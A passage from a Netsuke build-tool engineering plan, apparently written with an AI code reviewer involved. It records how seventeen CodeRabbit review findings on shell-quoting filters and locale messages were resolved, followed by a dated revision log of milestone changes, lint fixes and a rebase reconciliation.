   and obligations OBL-CONTEXT / OBL-JOIN-QUOTE-AGREE / OBL-KIND-GATE /
   OBL-COMPOSITION, and that a scenario count be corrected from five to eight.
   The checklist edit is unnecessary: those items are already named in EP-M4's
   own Red and Acceptance-evidence steps;
   `tests/shell_filter_composition_tests.rs` and all four obligations appear at
   `Validation and acceptance` lines 1946-1948. The scenario count is the one
   claim with substance, and measurement **rejects both figures**: the
   reviewer's "eight" is wrong, but the plan's bare "five new
   `tests/features/stdlib.feature` scenarios" is ambiguous in a way that
   invites exactly the reviewer's error. `tests/features/stdlib.feature` today
   has 43 scenarios, of which five contain "shell" — but those five are the
   pre-existing `shell` *command* filter (`shell filter transforms text…`,
   `…reports command failures`, `…enforces command output limits`,
   `…streams large output…`, `…enforces command stream limits`), present since
   before this plan and unrelated to `shell_quote`. The reviewer's eight is 5
   pre-existing shell + 2 `compact` + 1, i.e. a substring count. EP-M4's
   behavioural block lists five genuinely new `shell_quote`/`shell_join`
   scenarios, so the plan's number is right for the intended reading; the fix
   applied here names those five scenarios explicitly so the number can be
   checked rather than recounted. The lesson generalizes: **a scenario count in
   this plan must be identified by name, because "shell" matches two unrelated
   filters.**

   *False premise (finding 14, counted once in the locale group above).* The
   Czech finding asserts a defect at "both referenced locations". There is only
   one: `locales/cs/messages.ftl` has a single
   `manifest.env.default_not_string` entry, and the only other match anywhere
   is this plan's quotation of that line. A finding whose premise is a count
   that does not hold cannot be actioned as written — and it is the second time
   this reviewer has reported a multiplicity that the tree does not have (see
   EP-M1's four locale findings, entry 6), which is worth watching if the
   pattern recurs.

   *Evaluator preference over a settled decision (9 findings — 3, 5, 6, 7, 8,
   9, 14, and 2/4).* Seven are locale rewording requests — Dutch (3), Danish
   (5), German (6), Spanish (7), Welsh (8), Greek (9), and Czech (14) — all
   touching one message, `manifest.env.default_not_string`, and each asking for
   a different wording. They are declined on the same two grounds the EP-M1
   locale findings were: `docs/translators-guide.md` §7 makes leaving Netsuke's
   own identifiers untranslated the policy — `default` is a keyword users type,
   and it is untranslated in all 35 catalogues including the `en-US` source —
   and the `{ $kind }`-after-participle shape is the pre-existing house idiom,
   already used by `stdlib.collections.flatten` in the same catalogues.
   Findings 2 and 4 ask for per-test `///` comments in
   `tests/std_filter_tests/collection_filters/{mod,group_by_tests}.rs`; both
   files carry module-level `//!` docs, and `compact_tests.rs` — the file EP-M2
   actually wrote — already has per-test docs.

   *Wording (3 findings — 1/17, and 10).* Findings 1 and 17 (duplicates) ask
   that `tests/stdlib_manifest_query_tests.rs:196` parse JSON rather than
   substring-match. Finding 10 asks that `src/manifest/env_telemetry.rs`'s
   module doc add a validation-order clause. Both are defensible improvements
   to pre-existing code outside EP-M2's scope; neither describes a defect. They
   are left for a future pass rather than bundled into a milestone whose
   conformance check fixes its scope.

   Group totals: 1 (finding 11) + 4 (13, 16, 12, 15) + 9 (3, 5, 6, 7, 8, 9, 14,
   2, 4) + 3 (1, 17, 10) = 17. Disposition: **17 findings, 0 applied, 1 real
   plan ambiguity recorded and fixed (the scenario count in
   `Validation and acceptance`), 1 rejected on a false premise (finding 14's
   "both locations").** The rejection rate tracks EP-M1's and has the same
   cause — the reviewer reasons over the plan's *described* future state and
   over evaluator preferences, not over the tree it was given.

## Revision note

- 2026-09-08: initial draft.
- 2026-09-19: EP-M1 confirmation CodeRabbit pass cleared (see
  `Artefacts and notes` entry 6, continued). Three real plan defects fixed —
  AXIOM-4 restated so it agrees with D4, the duplicated `add src/shell_word.rs`
  removed from EP-M4's Green step, and EP-M5's invalid `8a`/`8b` list markers
  renumbered. One plan finding rejected as formally false and eight
  localization findings rejected under the translators-guide identifier rule.
  The pass ran against `d2c6f573` plus uncommitted plan edits and therefore
  reviewed no EP-M2 code.
- 2026-09-19: EP-M1 CodeRabbit review applied (see `Artefacts and notes` entry 6
  for the full disposition and the four rejected findings).
- 2026-09-19: EP-M1 implementation recorded. The `env` and `glob` registrations
  moved to `src/manifest/registration.rs` as a pure move (`16c3cfe6`);
  `env_var_with` became `env_var_with_default` with the `fallback` parameter
  placed *after* the policy parameter so ADR-026 still evaluates first and a
  blocked name never reaches the reader; `env_default_from_kwargs` reads
  `Option<Value>` and rejects a defined non-string; the disabled query stub
  widened to `Kwargs`; `manifest.env.args_error` and
  `manifest.env.default_not_string` added to all 35 catalogues; three
  `manifest.feature` scenarios and fixtures added. D4's `is_undefined` arm is
  deleted as unreachable — see `Surprises & discoveries`. The behavioural
  specification's `env` scenario moved from `stdlib.feature` to
  `manifest.feature`, because `env` is a manifest-loader helper and the stdlib
  harness never registers it.
- 2026-09-19: EP-M1's post-implementation lint triage recorded.

  **What changed.** Four deterministic findings from the first `make lint`
  after the feature went green, all now resolved: `doc_markdown` on `MiniJinja`
  and `option_if_let_else` in `src/manifest/registration.rs`; a
  `single_match_else`/`option_if_let_else` contradiction on one `match` in
  `src/manifest/env_reader.rs`; `too_many_arguments` (5/4) and a second
  `doc_markdown` in `tests/manifest_env_tests.rs`; and Whitaker's
  `no_expect_outside_tests` on the shared `assert_resolution` helper in
  `src/manifest/tests/env_function.rs`.

  **Why it changed the shape of the work.** It did not change any behaviour or
  any planned interface; the two structural extractions (`substitute_fallback`,
  `default_as_string`) and the `Resolved` enum in the test helper are internal.
  Two of the fixes, however, are recorded as observations because they are
  non-obvious properties of the gate toolchain: the two clippy lints that
  contradict each other on one site, and Whitaker keys on the nearest enclosing
  function rather than the file.

  **Effect on remaining work.** None on scope. The lesson that transfers is
  that a helper extracting a two-event arm from a `match` is the shape both
  clippy lints accept, and that asserting test helpers must compare rather than
  unwrap. Both are now known before EP-M3 and EP-M4 add more helpers of exactly
  these kinds — EP-M3 adds `quote_word` and `is_recipe_admissible`, and EP-M4
  adds a property-test module.
- 2026-09-09: revised after a six-lens community-of-experts design review.

  **What changed.** Three MiniJinja behaviours the draft asserted were
  falsified by direct experiment and are now corrected:
  `Kwargs::get::<Option<String>>` stringifies rather than raising (D4),
  `Value::try_iter()` accepts maps, strings, and `none` (D8), and a positional
  argument yields a detail-free `TooManyArguments` (AXIOM-4). The `quote_path`
  citation pointed at the wrong file. The encoder inventory said three where
  there are five. The acceptance transcript placed the interpolation inside
  double quotes, where the quoting corrupts the value rather than protecting it
  — the plan's own worst failure mode, in the plan's own example, invisible to
  all nine original obligations. Three module boundaries were redrawn: the
  encoder into a `src/shell_word.rs` leaf so `src/recipe_shell.rs` stays
  data-only; the stdlib module named `recipe_text` so it does not collide with
  `src/stdlib/command/`, which already owns a filter named `shell`; and the
  `ShellDialect` inverse deleted because the mapping is three-to-two. The
  control-character rule is reused from `validate_ninja_value` rather than
  reimplemented for a third time, and constraint 4 became a `clippy.toml` gate
  instead of prose. A threat model now names the attacker instead of repeating
  "non-negotiable security feature" unqualified. Five obligations were added
  (OBL-CONTEXT, OBL-JOIN-QUOTE-AGREE, OBL-KIND-GATE, OBL-COMPOSITION,
  OBL-NO-ESCAPE) and the behavioural scenarios now assert on the stable
  `[netsuke::jinja::…]` codes rather than English prose that thirty-two
  catalogues would translate away.

  **Why it changed the shape of the work.** The former EP-M4 and EP-M5 are now
  one milestone. Splitting them would have shipped a state where, on a Windows
  host with `NETSUKE_WINDOWS_SHELL=bash`, the filters quote for PowerShell
  while the recipe runs under Bash — and PowerShell's doubled single quote is
  *valid* POSIX syntax, so `a'b` silently becomes `ab` with no error anywhere.
  That is R11, and constraint 10 now forbids it.

  **Effect on remaining work.** Message keys rose from five to eleven, so the
  translation burden roughly doubles; decision D11 records the alternative that
  would cut it to one, and is cheap to adopt before EP-M4 and expensive after.
  EP-M1 gains a preparatory extraction because `src/manifest/mod.rs` is exactly
  at the 400-line cap. Milestone count fell from six to five. The plan still
  awaits approval; no implementation has begun.
- 2026-09-19: reconciled against `origin/main` after rebasing onto `0ba6672f`.

  **What changed.** Upstream had landed roughly twenty-nine commits of
  environment-policy, budget, and observability work that this plan either
  scheduled itself or assumed was pending. Six concrete corrections follow. (1)
  The plan's ADR is renumbered `021` → `027`: `adr-021` was taken by the
  upstream fetch-policy ADR, and five further ADRs landed on top of it, so
  `adr-026` is now the highest. (2) `src/manifest/registration.rs` **already
  exists** with exactly the four members this plan scheduled to extract, so R9
  became a convergence rather than a collision and EP-M1's extraction step is
  replaced by an extension step. (3) `env_var_with` already takes an
  `&EnvAccessPolicy` evaluated before the reader, so constraint 12 was added
  and EP-M1's signature and test plan now cover the blocked-with-default case —
  a hole the original draft could not have seen. (4) Every `env()` lookup
  already reaches a single telemetry boundary, so EP-M1 must not invent a fifth
  outcome vocabulary and EP-M5's new counter is conditional on saying what it
  adds. (5) Constraint 13 was added because a new metric series is silently
  dropped unless `src/observability_recorder.rs` admits it — a failure mode
  this plan had no rule for. (6) Every document-line and source-line citation
  was re-taken against `0ba6672f`; the `Conformance basis` table records the
  old and new anchors so a reader can tell drift from error. Three pre-existing
  internal inconsistencies in the milestone text were also fixed while
  reconciling, all of them pre-review drafts that the reviewed interface
  section had already superseded: EP-M3 named `src/recipe_shell/quoting.rs` and
  a `src/recipe_shell/` promotion where the reviewed boundary requires a
  `src/shell_word.rs` leaf and keeps `recipe_shell.rs` a data-only single file;
  and EP-M3 and EP-M5 named `src/stdlib/shell/` where the reviewed boundary
  names `src/stdlib/recipe_text/`.

  **Effect on remaining work.** EP-M1 is smaller (no extraction) but carries
  one new cross-cutting requirement (constraint 12). EP-M3 and EP-M4 are
  unchanged in size. The milestone count is unchanged at five. No code has been
  written; the only repository change so far is the rebase and this document.
